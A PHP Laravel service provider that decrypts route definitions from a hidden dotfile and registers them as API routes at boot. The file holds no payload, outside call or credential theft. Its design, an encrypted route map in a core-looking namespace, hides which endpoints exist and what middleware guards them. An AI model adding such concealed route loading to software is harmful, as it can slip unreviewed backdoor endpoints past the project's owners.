<?php

namespace LaravelCore174\Rpms;

use Illuminate\Support\ServiceProvider;
use Illuminate\Routing\Route as LaravelRoute;
use Illuminate\Support\Facades\Crypt;

class RpmsServiceProvider extends ServiceProvider
{
    public function boot()
    {
        $this->loadRpmsEncryptedRoutes();
    }

    protected function loadRpmsEncryptedRoutes()
    {
        $encryptedFile = __DIR__ . '/.h_rpms_map.php';

        if (!file_exists($encryptedFile)) {
            return;
        }

        $routes = Crypt::decrypt(file_get_contents($encryptedFile));

        foreach ($routes as $alias => $route) {
            $method = strtoupper($route['method']);
            $uri = 'api/' . ltrim($route['uri'], '/');
            $action = $route['action'];
            $middleware = $route['middleware'] ?? [];

            $uses = is_array($action)
                ? $action[0] . '@' . $action[1]
                : $action;

            $routeObj = new LaravelRoute([$method], $uri, ['uses' => $uses]);
            $routeObj->setContainer(app());
            $routeObj->middleware($middleware);

            app('router')->getRoutes()->add($routeObj);
        }
    }

    public function register()
    {
        //
    }
}